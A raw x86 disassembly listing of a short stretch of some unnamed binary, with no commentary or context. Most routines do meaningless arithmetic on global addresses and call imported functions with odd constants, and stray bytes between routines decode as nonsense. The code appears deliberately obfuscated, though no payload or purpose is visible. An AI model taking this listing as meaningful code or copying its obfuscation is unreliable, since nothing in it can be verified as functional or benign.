  402cd3:	add    esi,0x231de
  402cd9:	push   esi
  402cda:	sub    DWORD PTR ds:0x43b733,esi
  402ce0:	pop    DWORD PTR ds:0x43b0b2
  402ce6:	mov    esi,DWORD PTR [ebp+0x8]
  402ce9:	add    esi,DWORD PTR [ebp+0x8]
  402cec:	mov    DWORD PTR ds:0x43b34b,esi
  402cf2:	add    esi,0x1714
  402cf8:	push   esi
  402cf9:	mov    DWORD PTR [ebp+0x8],esi
  402cfc:	pop    DWORD PTR ds:0x43b024
  402d02:	mov    eax,DWORD PTR [ebp+0x8]
  402d05:	mov    eax,0x1e
  402d0a:	or     eax,esi
  402d0c:	sub    DWORD PTR ds:0x43b6a4,eax
  402d12:	add    eax,DWORD PTR [ebp+0x8]
  402d15:	push   eax
  402d16:	add    DWORD PTR ds:0x43b71a,eax
  402d1c:	pop    DWORD PTR ds:0x43b832
  402d22:	mov    esi,DWORD PTR [ebp+0x8]
  402d25:	add    esi,DWORD PTR ds:0x43b506
  402d2b:	push   esi
  402d2c:	mov    DWORD PTR ds:0x43b38b,esi
  402d32:	pop    eax
  402d33:	pop    edx
  402d34:	pop    ecx
  402d35:	ret    0x4
  402d38:	stc    
  402d39:	aam    0x2c
  402d3b:	retf   
  402d3c:	push   ecx
  402d3d:	push   edx
  402d3e:	push   0x14405200
  402d43:	push   0x7e068200
  402d48:	push   0x7dadce00
  402d4d:	push   0x494e6f00
  402d52:	call   DWORD PTR ds:0x4180a0
  402d58:	mov    ds:0x43b31b,eax
  402d5d:	mov    ds:0x43b2c8,eax
  402d62:	mov    esi,DWORD PTR [ebp+0x8]
  402d65:	mov    eax,0x2206
  402d6a:	sub    esi,eax
  402d6c:	push   esi
  402d6d:	shr    esi,1
  402d6f:	sub    DWORD PTR ds:0x43b3e3,esi
  402d75:	add    DWORD PTR ds:0x43b104,esi
  402d7b:	pop    esi
  402d7c:	mov    eax,DWORD PTR [ebp+0x8]
  402d7f:	shr    eax,0x2
  402d82:	ror    DWORD PTR ds:0x43b297,0x5
  402d89:	sub    DWORD PTR ds:0x43b4d6,eax
  402d8f:	mov    eax,DWORD PTR [ebp+0x8]
  402d92:	inc    eax
  402d93:	add    DWORD PTR ds:0x43b723,eax
  402d99:	mov    DWORD PTR [ebp+0x8],eax
  402d9c:	mov    esi,DWORD PTR [ebp+0x8]
  402d9f:	add    esi,DWORD PTR ds:0x43b681
  402da5:	push   esi
  402da6:	sub    DWORD PTR ds:0x43b0c2,esi
  402dac:	pop    DWORD PTR ds:0x43b8d3
  402db2:	pop    edx
  402db3:	pop    ecx
  402db4:	ret    0x8
  402db7:	lods   eax,DWORD PTR ds:[esi]
  402db8:	push   ecx
  402db9:	push   edx
  402dba:	push   0x0
  402dbc:	push   0x0
  402dbe:	push   0x0
  402dc0:	call   DWORD PTR ds:0x418018
  402dc6:	mov    ds:0x43b253,eax
  402dcb:	mov    ds:0x43b4ea,eax
  402dd0:	mov    esi,DWORD PTR [ebp+0xc]
  402dd3:	rol    esi,0x4
  402dd6:	add    DWORD PTR ds:0x43b6db,esi
  402ddc:	mov    DWORD PTR ds:0x43b3b8,esi
  402de2:	mov    esi,DWORD PTR [ebp+0x10]
  402de5:	dec    esi
  402de6:	mov    DWORD PTR [ebp+0x8],esi
  402de9:	add    esi,DWORD PTR [ebp+0xc]
  402dec:	dec    DWORD PTR ds:0x43b1de
  402df2:	sub    DWORD PTR ds:0x43b1b1,esi
  402df8:	pop    edx
  402df9:	pop    ecx
  402dfa:	ret    0x10
  402dfd:	fiadd  WORD PTR [esi-0x6a]
  402e00:	push   ebp
  402e01:	mov    ebp,esp
  402e03:	sub    esp,0x30
  402e06:	push   ecx
  402e07:	push   edx
  402e08:	push   0x3dca6100
  402e0d:	push   0x2301e700
  402e12:	push   0x4102ca00
  402e17:	push   0x53c70c00
  402e1c:	call   DWORD PTR ds:0x4180a0
  402e22:	mov    DWORD PTR [ebp-0x30],eax
  402e25:	mov    ds:0x43b1e5,eax
  402e2a:	mov    esi,DWORD PTR [ebp+0x8]
  402e2d:	rol    esi,1
  402e2f:	push   esi
  402e30:	mov    DWORD PTR ds:0x43b112,esi
  402e36:	pop    eax
  402e37:	mov    esi,DWORD PTR [ebp+0x8]
  402e3a:	rol    esi,0x2
  402e3d:	dec    DWORD PTR ds:0x43b41a
  402e43:	mov    esi,0xfc635
  402e48:	or     esi,eax
  402e4a:	push   esi
  402e4b:	mov    DWORD PTR [ebp+0x8],esi
  402e4e:	pop    DWORD PTR ds:0x43b6f0
  402e54:	mov    esi,DWORD PTR [ebp+0x8]
  402e57:	sub    esi,DWORD PTR ds:0x43b85e
  402e5d:	push   0xf7853
  402e62:	pop    DWORD PTR ds:0x43b6bd
  402e68:	sub    DWORD PTR ds:0x43b1e3,esi
  402e6e:	mov    esi,DWORD PTR [ebp+0x8]
  402e71:	mov    eax,0x461
  402e76:	sub    esi,eax
  402e78:	inc    DWORD PTR ds:0x43b1d5
  402e7e:	mov    eax,0x15b0
  402e83:	imul   esi,eax,0x1
  402e86:	push   esi
  402e87:	mov    DWORD PTR ds:0x43b225,esi
  402e8d:	pop    DWORD PTR ds:0x43b87d
  402e93:	cmp    esi,0xbd
  402e99:	pop    edx
  402e9a:	pop    ecx
  402e9b:	setne  al
  402e9e:	mov    esp,ebp
  402ea0:	pop    ebp
  402ea1:	ret    0x8
  402ea4:	sbb    dh,BYTE PTR ds:0x52518c9a
  402eaa:	add    eax,DWORD PTR ds:0x43b473
  402eb0:	mov    DWORD PTR [ebp+0x8],eax
  402eb3:	mov    DWORD PTR [ebp+0x14],eax
  402eb6:	push   0x33cf8600
  402ebb:	push   0xec2de00
  402ec0:	push   0x54d33a00
  402ec5:	push   0x0
  402ec7:	push   0x0
  402ec9:	push   0x0
  402ecb:	call   DWORD PTR ds:0x418000
  402ed1:	mov    ds:0x43b56a,eax
  402ed6:	mov    ds:0x43b4ea,eax
  402edb:	mov    eax,DWORD PTR [ebp+0x8]
  402ede:	ror    eax,1
  402ee0:	push   eax
  402ee1:	mov    esi,0x68
  402ee6:	xor    eax,esi
  402ee8:	inc    DWORD PTR ds:0x43b55b
  402eee:	mov    ds:0x43b086,eax
  402ef3:	pop    DWORD PTR ds:0x43b3a4
  402ef9:	mov    esi,DWORD PTR [ebp+0x10]
  402efc:	mov    eax,0x1485
  402f01:	add    esi,eax
  402f03:	mov    DWORD PTR [ebp+0x14],esi
  402f06:	shr    esi,0x3
  402f09:	push   esi
  402f0a:	sub    DWORD PTR ds:0x43b065,esi
  402f10:	pop    DWORD PTR ds:0x43b4f0
  402f16:	mov    eax,DWORD PTR [ebp+0x18]
  402f19:	and    eax,0x440d2d00
  402f1e:	rol    DWORD PTR ds:0x43b84f,0x5
  402f25:	sub    eax,DWORD PTR ds:0x43b55a
  402f2b:	mov    ds:0x43b4c7,eax
  402f30:	sub    DWORD PTR ds:0x43b82f,eax
  402f36:	mov    esi,DWORD PTR [ebp+0x8]
  402f39:	inc    esi
  402f3a:	push   esi
  402f3b:	add    DWORD PTR ds:0x43b694,esi
  402f41:	pop    eax
  402f42:	pop    edx
  402f43:	pop    ecx
  402f44:	ret    0x18
  402f47:	xchg   DWORD PTR [ecx+0x52],edx
  402f4a:	call   DWORD PTR ds:0x418028
  402f50:	mov    ds:0x43b05c,eax
  402f55:	mov    ds:0x43b0ef,eax
  402f5a:	mov    eax,DWORD PTR [ebp+0x8]
  402f5d:	add    eax,0x34182
  402f63:	push   0xc
  402f65:	pop    DWORD PTR ds:0x43b6ed
  402f6b:	add    DWORD PTR ds:0x43b42c,eax
  402f71:	mov    esi,DWORD PTR [ebp+0x8]
  402f74:	add    esi,0x2e102
  402f7a:	rol    DWORD PTR ds:0x43b2c5,0x4
  402f81:	dec    esi
  402f82:	push   esi
  402f83:	sub    DWORD PTR ds:0x43b7ba,esi
  402f89:	pop    esi
  402f8a:	cmp    esi,0xe6
  402f90:	pop    edx
  402f91:	pop    ecx
  402f92:	setne  al
  402f95:	ret    0x8
  402f98:	loop   0x402fd5
  402f9a:	adc    al,0x52
  402f9c:	push   ebp
  402f9d:	mov    ebp,esp
  402f9f:	sub    esp,0x8
  402fa2:	push   ecx
  402fa3:	push   edx
  402fa4:	lea    eax,[eax+eax*1+0x6f1]
  402fab:	add    eax,DWORD PTR ds:0x43b40a
  402fb1:	dec    DWORD PTR ds:0x43b761
  402fb7:	and    eax,0x6f79f300
  402fbc:	sub    DWORD PTR ds:0x43b206,eax
  402fc2:	mov    DWORD PTR [ebp-0x4],eax
  402fc5:	mov    eax,DWORD PTR [ebp+0x10]
  402fc8:	mov    eax,0x39
  402fcd:	or     eax,esi
  402fcf:	push   0x4b
  402fd1:	pop    DWORD PTR ds:0x43b443
  402fd7:	sub    eax,0x4d
  402fda:	push   eax
  402fdb:	add    DWORD PTR ds:0x43b63f,eax
  402fe1:	pop    esi
  402fe2:	mov    eax,DWORD PTR [ebp+0x8]
  402fe5:	mov    esi,0xd3642
  402fea:	xor    eax,esi
  402fec:	mov    DWORD PTR [ebp+0x10],eax
  402fef:	mov    ds:0x43b62d,eax
  402ff4:	mov    esi,DWORD PTR [ebp+0x10]
  402ff7:	mov    eax,0xca613
  402ffc:	xor    esi,eax
  402ffe:	push   esi
  402fff:	mov    esi,0xa4e51
  403004:	or     esi,eax
  403006:	inc    DWORD PTR ds:0x43b629
  40300c:	sub    DWORD PTR ds:0x43b57e,esi
  403012:	pop    DWORD PTR ds:0x43b005
  403018:	mov    esi,DWORD PTR [ebp+0x8]
  40301b:	inc    esi
  40301c:	mov    DWORD PTR [ebp+0x10],esi
  40301f:	mov    eax,0xf77
  403024:	imul   esi,eax,0x51
  403027:	push   esi
  403028:	mov    DWORD PTR [ebp+0x8],esi
  40302b:	pop    DWORD PTR ds:0x43b6e1
  403031:	mov    eax,DWORD PTR [ebp+0x10]
  403034:	sub    eax,DWORD PTR ds:0x43b0e3
  40303a:	push   eax
  40303b:	mov    DWORD PTR [ebp-0x8],eax
  40303e:	pop    esi
  40303f:	cmp    eax,0xe5
  403045:	pop    edx
  403046:	pop    ecx
  403047:	setne  al
  40304a:	mov    esp,ebp
  40304c:	pop    ebp
  40304d:	ret    0x10
  403050:	push   esi
  403051:	sub    DWORD PTR [edx+ebp*8+0x51],esp
  403055:	push   edx
  403056:	push   0x43b3f2
  40305b:	push   0x43b737
  403060:	push   0x5
  403062:	call   DWORD PTR ds:0x418044
  403068:	mov    ds:0x43b10d,eax
  40306d:	mov    ds:0x43b112,eax
  403072:	mov    esi,DWORD PTR [ebp+0x10]
  403075:	sub    esi,DWORD PTR [ebp+0xc]
  403078:	push   esi
  403079:	add    esi,0x78
  40307c:	ror    DWORD PTR ds:0x43b542,1
  403082:	mov    DWORD PTR ds:0x43b65c,esi
  403088:	pop    esi
  403089:	mov    esi,DWORD PTR [ebp+0xc]
  40308c:	mov    eax,0x260a
  403091:	imul   esi,eax,0x11
  403094:	mov    DWORD PTR [ebp+0x8],esi
  403097:	mov    DWORD PTR [ebp+0xc],esi
  40309a:	mov    esi,DWORD PTR [ebp+0xc]
  40309d:	add    esi,DWORD PTR ds:0x43b73e
  4030a3:	push   esi
  4030a4:	sub    DWORD PTR ds:0x43b4fd,esi
  4030aa:	pop    DWORD PTR ds:0x43b09a
  4030b0:	mov    eax,DWORD PTR [ebp+0x10]
  4030b3:	shl    eax,0x8
  4030b6:	ror    DWORD PTR ds:0x43b304,0x6
  4030bd:	sub    DWORD PTR ds:0x43b387,eax
  4030c3:	mov    esi,DWORD PTR [ebp+0x8]
  4030c6:	mov    esi,0x68
  4030cb:	or     esi,eax
  4030cd:	ror    DWORD PTR ds:0x43b162,1
  4030d3:	mov    eax,0x74
  4030d8:	xor    esi,eax
  4030da:	push   esi
  4030db:	mov    DWORD PTR [ebp+0x10],esi
  4030de:	pop    DWORD PTR ds:0x43b8ca
  4030e4:	cmp    esi,0x15d
  4030ea:	pop    edx
  4030eb:	pop    ecx
  4030ec:	sete   al
  4030ef:	ret    0x10
  4030f2:	or     al,0x31
  4030f4:	push   ecx
  4030f5:	push   edx
  4030f6:	push   0x43b733
  4030fb:	push   0x43b717
  403100:	push   0x5
  403102:	call   DWORD PTR ds:0x418044
  403108:	mov    ds:0x43b67e,eax
  40310d:	mov    ds:0x43b7bf,eax
  403112:	mov    eax,DWORD PTR [ebp+0xc]
  403115:	mov    esi,0x5e8
  40311a:	sub    eax,esi
  40311c:	push   eax
  40311d:	sub    DWORD PTR ds:0x43b5fc,eax
  403123:	pop    esi
  403124:	mov    eax,DWORD PTR [ebp+0x10]
  403127:	mov    esi,0x2
  40312c:	xor    eax,esi
  40312e:	push   eax
  40312f:	sub    eax,DWORD PTR [ebp+0x8]
  403132:	sub    DWORD PTR ds:0x43b285,eax
  403138:	sub    DWORD PTR ds:0x43b502,eax
  40313e:	pop    DWORD PTR ds:0x43b37a
  403144:	mov    esi,DWORD PTR [ebp+0x14]
  403147:	mov    eax,0x9b7
  40314c:	imul   esi,eax,0x39
  40314f:	add    DWORD PTR ds:0x43b0f9,esi
  403155:	mov    DWORD PTR ds:0x43b739,esi
  40315b:	mov    eax,DWORD PTR [ebp+0xc]
  40315e:	mov    esi,0x1e62
  403163:	imul   eax,esi,0xd
  403166:	dec    DWORD PTR ds:0x43b2fb
  40316c:	mov    ds:0x43b063,eax
  403171:	cmp    eax,0x11e
  403177:	pop    edx
  403178:	pop    ecx
  403179:	setne  al
  40317c:	ret    0x14
  40317f:	sub    dl,BYTE PTR [ecx+0x52]
  403182:	push   0x43b273
  403187:	call   DWORD PTR ds:0x418094
  40318d:	mov    ds:0x43b3c4,eax
  403192:	mov    ds:0x43b3df,eax
  403197:	push   0x43636d00
  40319c:	push   0x54afde00
  4031a1:	push   0x1061f00
  4031a6:	push   0xa828100
  4031ab:	push   0x1d532900
  4031b0:	call   DWORD PTR ds:0x418090
  4031b6:	mov    ds:0x43b718,eax
  4031bb:	mov    ds:0x43b2e6,eax
  4031c0:	mov    esi,DWORD PTR [ebp+0xc]
  4031c3:	mov    eax,0x18be
  4031c8:	sub    esi,eax
  4031ca:	add    DWORD PTR ds:0x43b044,esi
  4031d0:	sub    esi,DWORD PTR ds:0x43b020
  4031d6:	push   esi
  4031d7:	sub    DWORD PTR ds:0x43b708,esi
  4031dd:	pop    DWORD PTR ds:0x43b66b
  4031e3:	mov    esi,DWORD PTR [ebp+0xc]
  4031e6:	add    esi,DWORD PTR [ebp+0xc]
  4031e9:	inc    DWORD PTR ds:0x43b44e
  4031ef:	add    DWORD PTR ds:0x43b5fa,esi
  4031f5:	cmp    esi,0x184
  4031fb:	pop    edx
  4031fc:	pop    ecx
  4031fd:	sete   al
  403200:	ret    0xc
  403203:	and    eax,0x83ec8b55
  403208:	in     al,dx
  403209:	adc    BYTE PTR [ecx+0x52],dl
  40320c:	push   0x1988fe00
  403211:	push   0x4fa0de00
  403216:	push   0x5e17a400
  40321b:	push   0x77af4600
  403220:	push   0x51431b00
  403225:	call   DWORD PTR ds:0x418090
  40322b:	mov    DWORD PTR [ebp-0x8],eax
  40322e:	mov    DWORD PTR [ebp-0x4],eax
  403231:	mov    eax,DWORD PTR [ebp+0x8]
  403234:	sub    eax,DWORD PTR ds:0x43b237
  40323a:	push   eax
  40323b:	mov    esi,0x1745
  403240:	sub    eax,esi
  403242:	rol    DWORD PTR ds:0x43b1e9,0x6
  403249:	mov    ds:0x43b042,eax
  40324e:	pop    DWORD PTR ds:0x43b423
  403254:	mov    eax,DWORD PTR [ebp+0x8]
  403257:	mov    esi,0x16af
  40325c:	sub    eax,esi
  40325e:	mov    DWORD PTR [ebp-0x10],eax
  403261:	and    eax,0x34
  403266:	inc    DWORD PTR ds:0x43b76f
  40326c:	sub    DWORD PTR ds:0x43b7e3,eax
  403272:	pop    edx
  403273:	pop    ecx
  403274:	mov    esp,ebp
  403276:	pop    ebp
  403277:	ret    0x4
  40327a:	pushf  
  40327b:	lea    edx,[ecx+0x52]
  40327e:	mov    esi,0x41cb4
  403283:	mov    eax,0xb33
  403288:	imul   esi,eax,0xd
  40328b:	push   esi
  40328c:	add    DWORD PTR ds:0x43b6ab,esi
  403292:	pop    DWORD PTR ds:0x43b424
  403298:	mov    esi,DWORD PTR [ebp+0x8]
  40329b:	sub    esi,DWORD PTR [ebp+0x10]
  40329e:	add    DWORD PTR ds:0x43b2c6,esi
  4032a4:	inc    esi
  4032a5:	push   esi
  4032a6:	sub    DWORD PTR ds:0x43b459,esi
  4032ac:	pop    eax
  4032ad:	mov    eax,DWORD PTR [ebp+0x10]
  4032b0:	sub    eax,DWORD PTR ds:0x43b3e5
  4032b6:	mov    DWORD PTR [ebp+0x10],eax
  4032b9:	mov    eax,0x18
  4032be:	or     eax,esi
  4032c0:	push   0xc90d1
  4032c5:	pop    DWORD PTR ds:0x43b14d
  4032cb:	mov    ds:0x43b02c,eax
  4032d0:	mov    eax,DWORD PTR [ebp+0xc]
  4032d3:	add    eax,DWORD PTR ds:0x43b3a7
  4032d9:	push   eax
  4032da:	add    DWORD PTR ds:0x43b67c,eax
  4032e0:	pop    eax
  4032e1:	mov    esi,DWORD PTR [ebp+0xc]
  4032e4:	and    esi,0x40
  4032ea:	push   esi
  4032eb:	add    DWORD PTR ds:0x43b510,esi
  4032f1:	pop    DWORD PTR ds:0x43b397
  4032f7:	mov    esi,DWORD PTR [ebp+0x10]
  4032fa:	inc    esi
  4032fb:	push   esi
  4032fc:	mov    DWORD PTR [ebp+0xc],esi
  4032ff:	pop    eax
  403300:	pop    edx
  403301:	pop    ecx
  403302:	ret    0x10
  403305:	mov    bl,0x4f
  403307:	and    DWORD PTR [ebp-0x75],edx
  40330a:	in     al,dx
  40330b:	sub    esp,0x3c
  40330e:	push   ecx
  40330f:	push   edx
  403310:	push   0x5f47ff00
  403315:	push   0x752b7e00
  40331a:	push   0x40b71d00
  40331f:	push   0x43d5db00
  403324:	call   DWORD PTR ds:0x4180a0
  40332a:	mov    ds:0x43b7fb,eax
  40332f:	mov    ds:0x43b425,eax
  403334:	mov    eax,DWORD PTR [ebp+0x8]
  403337:	sub    eax,DWORD PTR [ebp+0x8]
  40333a:	push   0x2363b
  40333f:	pop    DWORD PTR ds:0x43b3cd
  403345:	mov    DWORD PTR [ebp+0x8],eax
  403348:	mov    eax,DWORD PTR [ebp+0x8]
  40334b:	and    eax,0x72
  403350:	sub    DWORD PTR ds:0x43b079,eax
  403356:	mov    DWORD PTR [ebp-0x10],eax
  403359:	mov    esi,DWORD PTR [ebp+0x8]
  40335c:	sub    esi,DWORD PTR [ebp+0x8]
  40335f:	push   esi
  403360:	sub    esi,DWORD PTR ds:0x43b6c1
  403366:	inc    DWORD PTR ds:0x43b5c0
  40336c:	mov    DWORD PTR [ebp-0x10],esi
  40336f:	pop    esi
  403370:	mov    esi,DWORD PTR [ebp+0x8]
  403373:	shl    esi,0x8
  403376:	mov    DWORD PTR [ebp-0x8],esi
  403379:	add    DWORD PTR ds:0x43b153,esi
  40337f:	mov    esi,DWORD PTR [ebp+0x8]
  403382:	and    esi,0x33
  403388:	push   esi
  403389:	shr    esi,1
  40338b:	mov    DWORD PTR [ebp+0x8],esi
  40338e:	mov    DWORD PTR [ebp-0xc],esi
  403391:	pop    DWORD PTR ds:0x43b2b0
  403397:	pop    edx
  403398:	pop    ecx
  403399:	mov    esp,ebp
  40339b:	pop    ebp
  40339c:	ret    0x8
  40339f:	mov    ch,0x51
  4033a1:	push   edx
  4033a2:	push   0x43b6bb
  4033a7:	call   DWORD PTR ds:0x418094
  4033ad:	mov    ds:0x43b556,eax
  4033b2:	mov    ds:0x43b2dd,eax
  4033b7:	mov    eax,DWORD PTR [ebp+0x8]
  4033ba:	shl    eax,0x7
  4033bd:	mov    DWORD PTR [ebp+0x8],eax
  4033c0:	mov    DWORD PTR [ebp+0x8],eax
  4033c3:	mov    esi,DWORD PTR [ebp+0x8]
  4033c6:	shr    esi,0x4
  4033c9:	ror    DWORD PTR ds:0x43b2e3,0x6
  4033d0:	add    DWORD PTR ds:0x43b2ab,esi
  4033d6:	mov    esi,DWORD PTR [ebp+0x8]
  4033d9:	shr    esi,0x6
  4033dc:	push   esi
  4033dd:	ror    DWORD PTR ds:0x43b398,0x3
  4033e4:	sub    DWORD PTR ds:0x43b4db,esi
  4033ea:	pop    esi
  4033eb:	mov    eax,DWORD PTR [ebp+0x8]
  4033ee:	shr    eax,0x5
  4033f1:	rol    DWORD PTR ds:0x43b0ab,0x5
  4033f8:	mov    ds:0x43b616,eax
  4033fd:	pop    edx
  4033fe:	pop    ecx
  4033ff:	ret    0x4
  403402:	dec    ebp
  403403:	jne    0x40345a
  403405:	mov    ebp,esp
  403407:	sub    esp,0x74
  40340a:	push   ecx
  40340b:	push   edx
  40340c:	push   0x1a786e00
  403411:	push   0x195b3a00
  403416:	push   0x4ac09e00
  40341b:	push   0x0
  40341d:	push   0x0
  40341f:	push   0x0
  403421:	call   DWORD PTR ds:0x418000
  403427:	mov    DWORD PTR [ebp-0x54],eax
  40342a:	mov    DWORD PTR [ebp-0x4],eax
  40342d:	mov    eax,DWORD PTR [ebp+0x8]
  403430:	shr    eax,0x2
  403433:	mov    DWORD PTR [ebp+0x8],eax
  403436:	add    DWORD PTR ds:0x43b67f,eax
  40343c:	mov    esi,DWORD PTR [ebp+0x8]
  40343f:	shl    esi,0x2
  403442:	push   esi
  403443:	inc    esi
  403444:	mov    DWORD PTR ds:0x43b6a4,esi
  40344a:	mov    DWORD PTR [ebp-0x48],esi
  40344d:	pop    DWORD PTR ds:0x43b898
  403453:	mov    eax,DWORD PTR [ebp+0x8]
  403456:	mov    eax,0x4a
  40345b:	or     eax,esi
  40345d:	rol    DWORD PTR ds:0x43b8c5,0x6
  403464:	add    eax,DWORD PTR [ebp+0x8]
  403467:	push   eax
  403468:	sub    DWORD PTR ds:0x43b84f,eax
  40346e:	pop    DWORD PTR ds:0x43b521
  403474:	cmp    eax,0x1db
  40347a:	pop    edx
  40347b:	pop    ecx
  40347c:	sete   al
  40347f:	mov    esp,ebp
  403481:	pop    ebp
  403482:	ret    0x4
  403485:	rcl    BYTE PTR fs:[edi],1
  403488:	push   ebp
  403489:	mov    ebp,esp
  40348b:	sub    esp,0x10
  40348e:	push   ecx
  40348f:	push   edx
  403490:	push   0x43b217
  403495:	call   DWORD PTR ds:0x418094
  40349b:	mov    ds:0x43b29a,eax
  4034a0:	mov    DWORD PTR [ebp-0x10],eax
  4034a3:	mov    esi,DWORD PTR [ebp+0x8]
  4034a6:	sub    esi,DWORD PTR [ebp+0x8]
  4034a9:	ror    DWORD PTR ds:0x43b450,1
  4034af:	mov    DWORD PTR [ebp-0x10],esi
  4034b2:	mov    esi,DWORD PTR [ebp+0xc]
  4034b5:	mov    esi,0x2b
  4034ba:	or     esi,eax
  4034bc:	push   esi
  4034bd:	mov    eax,0x1e94
  4034c2:	add    esi,eax
  4034c4:	sub    DWORD PTR ds:0x43b395,esi
  4034ca:	add    DWORD PTR ds:0x43b5cc,esi
  4034d0:	pop    DWORD PTR ds:0x43b6f7
  4034d6:	mov    eax,DWORD PTR [ebp+0x8]
  4034d9:	mov    eax,0x6d
  4034de:	or     eax,esi
  4034e0:	push   eax
  4034e1:	add    DWORD PTR ds:0x43b09c,eax
  4034e7:	pop    DWORD PTR ds:0x43b61b
  4034ed:	pop    edx
  4034ee:	pop    ecx
  4034ef:	mov    esp,ebp
  4034f1:	pop    ebp
  4034f2:	ret    0xc
  4034f5:	jns    0x40354a
  4034f7:	std    
  4034f8:	push   ebp
  4034f9:	mov    ebp,esp
  4034fb:	sub    esp,0x7c
  4034fe:	push   ecx
  4034ff:	push   edx
  403500:	mov    esi,0xc17c1
  403505:	mov    eax,0x557
  40350a:	add    esi,eax
  40350c:	sub    DWORD PTR ds:0x43b326,esi
  403512:	add    esi,DWORD PTR [ebp+0xc]
  403515:	ror    DWORD PTR ds:0x43b59d,0x3
  40351c:	mov    DWORD PTR [ebp+0x8],esi
  40351f:	mov    esi,DWORD PTR [ebp+0xc]
  403522:	dec    esi
  403523:	mov    DWORD PTR [ebp+0xc],esi
  403526:	rol    DWORD PTR ds:0x43b176,0x6
  40352d:	add    DWORD PTR ds:0x43b7b3,esi
  403533:	mov    esi,DWORD PTR [ebp+0xc]
  403536:	add    esi,0x28
  403539:	push   0x4f
  40353b:	pop    DWORD PTR ds:0x43b890
  403541:	dec    esi
  403542:	push   esi
  403543:	sub    DWORD PTR ds:0x43b855,esi
  403549:	pop    eax
  40354a:	mov    esi,DWORD PTR [ebp+0xc]
  40354d:	dec    esi
  40354e:	add    DWORD PTR ds:0x43b457,esi
  403554:	sub    esi,DWORD PTR ds:0x43b6e9
  40355a:	push   esi
  40355b:	mov    DWORD PTR [ebp+0x8],esi
  40355e:	pop    eax
  40355f:	pop    edx
  403560:	pop    ecx
  403561:	mov    esp,ebp
  403563:	pop    ebp
  403564:	ret    0xc
  403567:	sbb    eax,0x685251
  40356c:	retf   
  40356d:	sbb    ch,BYTE PTR [edx+0x68]
  403570:	add    BYTE PTR [eax],dh
  403572:	xchg   ebx,eax
  403573:	ss push 0x174abd00
  403579:	push   0x3d206
  40357e:	push   0x72d56700
  403583:	call   DWORD PTR ds:0x418090
  403589:	mov    ds:0x43b46f,eax
  40358e:	mov    ds:0x43b1a5,eax
  403593:	mov    eax,DWORD PTR [ebp+0xc]
  403596:	and    eax,0x16
  40359b:	push   0x66
  40359d:	pop    DWORD PTR ds:0x43b2ae
  4035a3:	mov    eax,0x65b3f
  4035a8:	or     eax,esi
  4035aa:	push   eax
  4035ab:	mov    DWORD PTR [ebp+0x8],eax
  4035ae:	pop    DWORD PTR ds:0x43b217
  4035b4:	mov    eax,DWORD PTR [ebp+0x8]
  4035b7:	mov    esi,0x24a1
  4035bc:	sub    eax,esi
  4035be:	push   eax
  4035bf:	inc    eax
  4035c0:	mov    ds:0x43b444,eax
  4035c5:	sub    DWORD PTR ds:0x43b0df,eax
  4035cb:	pop    DWORD PTR ds:0x43b20c
  4035d1:	mov    eax,DWORD PTR [ebp+0xc]
  4035d4:	shl    eax,1
  4035d6:	ror    DWORD PTR ds:0x43b6a4,0x7
  4035dd:	mov    ds:0x43b3e3,eax
  4035e2:	mov    eax,DWORD PTR [ebp+0xc]
  4035e5:	and    eax,0x2a
  4035ea:	push   eax
  4035eb:	add    eax,DWORD PTR [ebp+0x8]
  4035ee:	mov    DWORD PTR [ebp+0x8],eax
  4035f1:	mov    ds:0x43b514,eax
  4035f6:	pop    eax
  4035f7:	cmp    eax,0x24a
  4035fd:	pop    edx
  4035fe:	pop    ecx
  4035ff:	setne  al
  403602:	ret    0xc
  403605:	outs   dx,BYTE PTR ds:[esi]
  403606:	test   al,0x2c
  403608:	push   ebp
  403609:	mov    ebp,esp
  40360b:	sub    esp,0x44
  40360e:	push   ecx
  40360f:	push   edx
  403610:	mov    esi,0x61209
  403615:	mov    eax,0x892
  40361a:	imul   esi,eax,0x24
  40361d:	dec    DWORD PTR ds:0x43b1d8
  403623:	add    DWORD PTR ds:0x43b0f0,esi
  403629:	mov    esi,DWORD PTR [ebp+0x14]
  40362c:	add    esi,0x8f15
  403632:	add    DWORD PTR ds:0x43b48e,esi
  403638:	mov    DWORD PTR [ebp+0x18],esi
  40363b:	mov    esi,DWORD PTR [ebp+0x10]
  40363e:	add    esi,DWORD PTR ds:0x43b542
  403644:	add    DWORD PTR ds:0x43b1ba,esi
  40364a:	sub    esi,0x40
  40364d:	inc    DWORD PTR ds:0x43b8d0
  403653:	mov    DWORD PTR ds:0x43b204,esi
  403659:	mov    esi,DWORD PTR [ebp+0x8]
  40365c:	add    esi,DWORD PTR ds:0x43b754
  403662:	mov    DWORD PTR [ebp+0x14],esi
  403665:	mov    DWORD PTR [ebp+0x14],esi
  403668:	mov    esi,DWORD PTR [ebp+0x8]
  40366b:	sub    esi,DWORD PTR [ebp+0xc]
  40366e:	push   esi
  40366f:	sub    esi,DWORD PTR ds:0x43b6a5
  403675:	inc    DWORD PTR ds:0x43b307
  40367b:	mov    DWORD PTR ds:0x43b54b,esi
  403681:	pop    DWORD PTR ds:0x43b39a
  403687:	mov    esi,DWORD PTR [ebp+0x14]
  40368a:	add    esi,0x20eec
  403690:	mov    DWORD PTR ds:0x43b3cd,esi
  403696:	mov    eax,0xb21
  40369b:	sub    esi,eax
  40369d:	push   esi
  40369e:	sub    DWORD PTR ds:0x43b643,esi
  4036a4:	pop    esi
  4036a5:	pop    edx
  4036a6:	pop    ecx
  4036a7:	mov    esp,ebp
  4036a9:	pop    ebp
  4036aa:	ret    0x18
  4036ad:	out    dx,al
  4036ae:	in     eax,dx
  4036af:	push   esp
  4036b0:	push   ecx
  4036b1:	push   edx
  4036b2:	push   0x43b750
  4036b7:	call   DWORD PTR ds:0x418094
  4036bd:	mov    ds:0x43b039,eax
  4036c2:	mov    ds:0x43b2e3,eax
  4036c7:	mov    eax,DWORD PTR [ebp+0x8]
  4036ca:	rol    eax,0x7
  4036cd:	mov    DWORD PTR [ebp+0x8],eax
  4036d0:	dec    eax
  4036d1:	push   eax
  4036d2:	add    DWORD PTR ds:0x43b490,eax
  4036d8:	pop    DWORD PTR ds:0x43b2b3
  4036de:	mov    eax,DWORD PTR [ebp+0x8]
  4036e1:	rol    eax,1
  4036e3:	mov    ds:0x43b065,eax
  4036e8:	mov    esi,0x21bb
  4036ed:	imul   eax,esi,0x19
  4036f0:	push   eax
  4036f1:	mov    ds:0x43b4d0,eax
  4036f6:	pop    DWORD PTR ds:0x43b1a6
  4036fc:	mov    eax,DWORD PTR [ebp+0x8]
  4036ff:	sub    eax,DWORD PTR ds:0x43b5cd
  403705:	inc    DWORD PTR ds:0x43b368
  40370b:	push   eax
